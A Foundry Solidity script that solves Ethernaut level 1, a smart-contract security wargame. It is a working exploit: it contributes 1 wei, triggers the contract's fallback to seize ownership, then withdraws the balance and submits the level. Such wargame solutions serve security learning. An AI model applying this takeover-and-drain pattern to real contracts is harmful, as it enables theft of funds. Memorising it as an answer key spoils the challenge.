// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Fallback} from "../src/Level01.sol";
import "forge-std/console.sol";


contract Level01 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {

        Fallback instance = Fallback(payable(vm.envAddress("LVL01_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.contribute{value: 1 wei}();
        (bool success, bytes memory data) = address(instance).call{value: 1 wei}("");

        if (success){
            uint256 balanceBeforeWithdraw = address(instance).balance;
            instance.withdraw();
            ethernaut.submitLevelInstance(address(instance));
            uint256 balanceAfterWithdraw = address(instance).balance;
            if(balanceAfterWithdraw < balanceBeforeWithdraw && balanceAfterWithdraw == 0)
                console.log("Level01: Success");
            else
                console.log("Level01: Fail");
        }

        vm.stopBroadcast();
    }
}